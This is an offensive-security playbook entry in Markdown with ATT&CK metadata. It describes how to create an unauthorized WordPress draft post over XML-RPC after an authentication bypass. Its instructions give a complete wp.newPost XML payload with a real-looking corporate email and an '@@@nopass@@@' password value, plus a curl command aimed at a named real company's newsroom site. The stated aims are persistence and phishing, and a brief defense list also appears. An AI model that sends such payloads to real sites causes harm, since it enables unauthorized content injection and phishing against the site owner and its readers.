---
tags:
  - content-creation
  - xmlrpc
type: procedure
tools:
  - '[[tools/Curl-for-XMLRPC-Exploitation]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:52.547Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 8081eec7-5f0c-43d7-992e-a4fe3872fcb2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Draft-Post-via-XMLRPC

## Summary

Uses authenticated XMLRPC access to create a new draft post or page in WordPress, demonstrating unauthorized content modification without publishing.

## Description

After auth bypass, call wp.newPost with parameters like post_title, post_content, and omit post_status for draft. Requires sufficient user privileges (e.g., author role). This inserts content into the database, visible to admins, and can be used for persistence or phishing.

## Requirements

1. Successful XMLRPC authentication
2. Known privileged username
3. XML payload (post.xml) with wp.newPost method
4. Curl for sending requests

## Defense

Defensive measures and detection strategies:

- Limit XMLRPC to authenticated users only
- Audit user privileges for OneLogin accounts
- Log all wp.newPost calls and alert on drafts from unknown IPs
- Disable XMLRPC or use security plugins like Wordfence

## Objectives

1. Insert unauthorized content
2. Test privilege level
3. Prepare for further persistence

## Instructions

### Step 1: Prepare Post XML

**Context**: Build XML for wp.newPost without post_status to save as draft.

**Command**:
```bash
# Create post.xml example:
# <?xml version="1.0"?>
# <methodCall>
# <methodName>wp.newPost</methodName>
# <params>
# <param><value><string>1</string></value></param> <!-- blog_id -->
# <param><value><string>cbarry@uber.com</string></value></param>
# <param><value><string>@@@nopass@@@</string></value></param>
# <param><value><struct>
# <member><name>post_title</name><value><string>Test Draft</string></value></member>
# <member><name>post_content</name><value><string>Malicious content</string></value></member>
# </struct></value></param>
# </params>
# </methodCall>
```

> Defines the post structure.

### Step 2: Execute Post Creation

**Context**: Send to xmlrpc.php to create the draft.

**Command**:
```bash
curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat post.xml`" -H 'Content-type: application/xml'
```

> Returns post ID on success; verify in WP admin.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Curl-for-XMLRPC-Exploitation]]

## Tags

- content-creation
- xmlrpc
